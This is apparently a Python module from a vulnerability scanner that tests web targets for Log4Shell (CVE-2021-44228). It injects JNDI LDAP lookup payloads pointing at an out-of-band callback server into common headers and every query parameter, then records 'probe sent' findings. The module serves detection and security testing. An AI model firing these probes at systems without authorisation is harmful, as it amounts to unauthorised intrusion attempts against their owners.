"""
cyberm4fia-scanner - Log4Shell (CVE-2021-44228) Scanner

Detects whether a target's logging stack interpolates JNDI lookups
embedded in user-controlled fields. Verification requires an
out-of-band (OOB) collaborator — without it we can only fire the
payloads and report "probe sent".

Public CVE: CVE-2021-44228 (Log4j 2.x < 2.16.0). PoC pattern is
public knowledge — independent reimplementation here.

Detection strategy
------------------
* Inject ``${jndi:ldap://<oob-id>.<oob-server>/x}`` into:
    - the User-Agent header
    - the Referer header
    - the X-Forwarded-For header
    - every reflected GET parameter (best-effort)
* Return a "probe sent" finding listing the unique OOB ID per target.
* Caller polls the OOB server (utils/oob_server.py) afterwards to
  promote the finding from "probe sent" → "confirmed".
"""

from __future__ import annotations

import os
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from utils.colors import log_info, log_warning
from utils.request import BlockedTargetPath, ScanExceptions, smart_request


# OOB collaborator — interact.sh by default; user can override via env.
def _oob_server() -> str:
    return os.environ.get("OOB_SERVER", "interact.sh").strip() or "interact.sh"


def _build_payload(token: str) -> str:
    return "${jndi:ldap://" + token + "." + _oob_server() + "/x}"


# Headers commonly logged at request-time. Hitting these is enough on
# most Java stacks because the access logger calls `log.info(req)`.
_HEADER_VECTORS: tuple[str, ...] = (
    "User-Agent",
    "Referer",
    "X-Forwarded-For",
    "X-Api-Version",
    "X-Real-Ip",
    "X-Wap-Profile",
    "X-Forwarded-Host",
    "Forwarded",
)


def _inject_query(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    flat = {k: (v[0] if isinstance(v, list) else v) for k, v in qs.items()}
    return urlunparse(parsed._replace(query=urlencode(flat)))


def scan_log4shell(url: str, params: list[str] | None = None,
                   threads: int = 4, delay: float = 0.0) -> list[dict]:
    """Send Log4Shell JNDI probes to the target and report which vectors fired.

    The findings emitted are 'probe_sent' rather than 'confirmed' — true
    confirmation requires polling the OOB collaborator afterwards. Hook
    into utils.oob_server to promote.
    """
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    target_params = list(params) if params else list(qs.keys())

    log_info(f"☢️  Log4Shell: {len(_HEADER_VECTORS)} header vector(s)"
             f" + {len(target_params)} param on {url[:60]}")

    findings: list[dict] = []

    def _probe_header(header_name: str) -> dict | None:
        token = uuid.uuid4().hex[:12]
        payload = _build_payload(token)
        try:
            resp = smart_request(
                "get", url, delay=delay,
                headers={header_name: payload},
                allow_redirects=False,
            )
        except (ScanExceptions, BlockedTargetPath):
            return None
        return {
            "type": "Log4Shell_Probe",
            "url": url,
            "vector": f"header:{header_name}",
            "payload": payload,
            "oob_token": token,
            "oob_server": _oob_server(),
            "status_code": getattr(resp, "status_code", 0) if resp else 0,
            "evidence": (
                "JNDI probe sent. Confirmation requires polling the OOB "
                f"collaborator for callback to '{token}.{_oob_server()}'."
            ),
            "severity": "Critical",
            "confidence": 30,  # probe-only; low until OOB callback observed
            "validation_state": "probe_sent",
            "module": "log4shell",
        }

    def _probe_param(param: str) -> dict | None:
        token = uuid.uuid4().hex[:12]
        payload = _build_payload(token)
        injected = _inject_query(url, param, payload)
        try:
            resp = smart_request("get", injected, delay=delay,
                                 allow_redirects=False)
        except (ScanExceptions, BlockedTargetPath):
            return None
        return {
            "type": "Log4Shell_Probe",
            "url": url,
            "vector": f"param:{param}",
            "param": param,
            "payload": payload,
            "oob_token": token,
            "oob_server": _oob_server(),
            "status_code": getattr(resp, "status_code", 0) if resp else 0,
            "evidence": (
                "JNDI probe sent in query parameter. Confirmation requires "
                f"polling the OOB collaborator for '{token}.{_oob_server()}'."
            ),
            "severity": "Critical",
            "confidence": 30,
            "validation_state": "probe_sent",
            "module": "log4shell",
        }

    with ThreadPoolExecutor(max_workers=max(1, threads)) as pool:
        futs = []
        futs += [pool.submit(_probe_header, h) for h in _HEADER_VECTORS]
        futs += [pool.submit(_probe_param, p) for p in target_params]
        for fut in as_completed(futs):
            try:
                f = fut.result()
            except Exception as exc:
                log_warning(f"  Log4Shell probe failed: {exc}")
                continue
            if f:
                findings.append(f)

    return findings
